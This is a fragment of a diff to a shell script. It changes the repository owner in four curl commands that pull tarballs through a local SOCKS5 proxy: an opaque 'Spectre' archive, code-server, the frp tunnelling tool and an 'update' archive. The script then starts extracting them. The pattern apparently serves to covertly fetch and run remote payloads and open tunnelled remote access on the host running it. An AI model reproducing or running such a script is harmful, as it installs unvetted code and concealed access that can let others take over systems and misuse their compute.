@@ -80,16 +80,16 @@ sleep 2
 ls -la
 
 sleep 4
-curl -x socks5h://127.0.0.1:1080 https://raw.githubusercontent.com/phillipnoodles/jobrunner/refs/heads/main/Spectre.tar.gz -L -O -J
+curl -x socks5h://127.0.0.1:1080 https://raw.githubusercontent.com/mncedisihlabathini/jobrunner/refs/heads/main/Spectre.tar.gz -L -O -J
 
 sleep 2
-curl -x socks5h://127.0.0.1:1080 https://raw.githubusercontent.com/phillipnoodles/jobrunner/refs/heads/main/code-server-4.14.1-linux-amd64.tar.gz -L -O -J
+curl -x socks5h://127.0.0.1:1080 https://raw.githubusercontent.com/mncedisihlabathini/jobrunner/refs/heads/main/code-server-4.14.1-linux-amd64.tar.gz -L -O -J
 
 sleep 2
-curl -x socks5h://127.0.0.1:1080 https://raw.githubusercontent.com/phillipnoodles/jobrunner/refs/heads/main/frp_0.48.0_linux_amd64.tar.gz -L -O -J
+curl -x socks5h://127.0.0.1:1080 https://raw.githubusercontent.com/mncedisihlabathini/jobrunner/refs/heads/main/frp_0.48.0_linux_amd64.tar.gz -L -O -J
 
 sleep 2
-curl -x socks5h://127.0.0.1:1080 https://raw.githubusercontent.com/phillipnoodles/jobrunner/refs/heads/main/update.tar.gz -L -O -J
+curl -x socks5h://127.0.0.1:1080 https://raw.githubusercontent.com/mncedisihlabathini/jobrunner/refs/heads/main/update.tar.gz -L -O -J
 sleep 2
 
 tar -xf Spectre.tar.gz
